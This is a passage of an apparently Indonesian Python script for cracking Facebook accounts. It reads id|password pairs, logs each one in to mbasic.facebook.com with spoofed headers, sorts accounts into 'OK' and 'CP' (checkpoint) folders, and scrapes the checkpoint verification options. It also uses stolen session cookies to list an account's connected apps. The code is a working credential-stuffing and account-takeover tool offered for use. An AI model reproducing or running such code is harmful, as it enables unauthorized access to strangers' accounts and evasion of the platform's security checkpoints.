	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ╰─≫ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ╰─≫ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def cek_opsi():
	c = len(akun)
	hu = '#'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] INPUT')
	cek = '# PROSESES CO'
	sol().print(mark(cek, style='pink'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ERROR=-     %s'%(b,kes,x))
				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> 𝑪𝑷       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> 𝑪𝑷       %s'%(b,id,pw,x))
					print('\r%s---> Cannot Check Options%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> 𝑶𝑲       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> ERROR       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '#INTERNET NO CONNECTED'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='pink'))
	exit()

def cek_TaRmAY(kuki):
 session = requests.Session()
 w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
 sop = bs4.BeautifulSoup(w,"html.parser")
 x = sop.find("form",method="post")
 game = [i.text for i in x.find_all("h3")]
 try:
  for i in range(len(game)):
   print ("\r%s  \033[0m  %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 except AttributeError:
  print ("\r    %s\033[0m cookie invalid"%(M))
 w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
 sop = bs4.BeautifulSoup(w,"html.parser")
 x = sop.find("form",method="post")
 game = [i.text for i in x.find_all("h3")]
 try:
  for i in range(len(game)):
   print ("\r%s  \033[0m  %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
 except AttributeError:
  print ("\r    %s \033[0mcookie invalid"%(M))

if __name__=='__main__':
	try:os.mkdir('𝑶𝑲')
	except:pass
	try:os.mkdir('𝑪𝑷')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()
